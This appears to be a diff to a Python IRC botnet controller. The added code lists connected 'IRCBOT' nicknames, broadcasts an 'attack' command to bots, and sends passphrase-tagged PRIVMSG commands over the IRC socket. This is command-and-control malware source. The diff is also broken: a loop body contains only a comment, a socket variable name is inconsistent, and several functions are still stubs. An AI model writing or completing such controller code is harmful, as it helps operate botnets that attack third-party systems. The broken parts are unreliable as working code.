@@ -12,21 +12,54 @@ IRCSOCKET = None
 conNick = "CONTROLLER "
 liveConnection = False # Flag to see if controller connection to IRC Server is active
 
+# BOT INFO
+botList = []
+botSuccess = []
+botFails = []
+
 
 # Get response from Bot 
 def getResponse():
     try:
         # Get response from bot
         msg = ircSocket.recv(1024).decode('utf-8')
+        return msg 
+    except:
+        return False
 
 # COMMANDS
 # Get bot status
 def botStatus():
-    pass
+    # Get bot Nickname and how many there are
+    # Append these bots to a list
+    msg = getResponse()
+    if msg != False:
+        msg = msg.strip()
+        msgLines = msg.split("\n")
+        # Get bot names from split lines
+        for x in msgLines:
+            if x.startswith(":IRCBOT"):
+                botName = x[x.find(":", 1) + 1:].strip()
+                botList.append(botName)
+        botNames = "\n".join(botList)
+        print("Num of bots: " + str(len(botList)) + "\nBot Names:\n" + botNames)
+        botList.clear()
 
 # Tell bot to attack
 def botAttack(host, port, channel):
-    pass
+    sendCommand("attack")
+    # Get bot responses 
+    msg = getResponse()
+    if msg != False:
+        try:
+            msg = msg.strip()
+            msgLines = msg.split("\n")
+            for x in msgLines:
+                # Get bot responses
+        except:
+            pass
+
+
 
 # Tell bot to move channel
 def botMove(host, port, channel):
@@ -40,8 +73,11 @@ def botQuit():
 def botShutdown(): 
     pass
 
+# SEND A PRIVATE MESSAGE/COMMAND TO BOTS
 def sendCommand(msg):
-    pass 
+    toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + conNick + " " + PHRASE + "\n"
+    IRCSOCKET.send(toBot.encode())
+    return
 
 def botHandler():
     global liveConnection
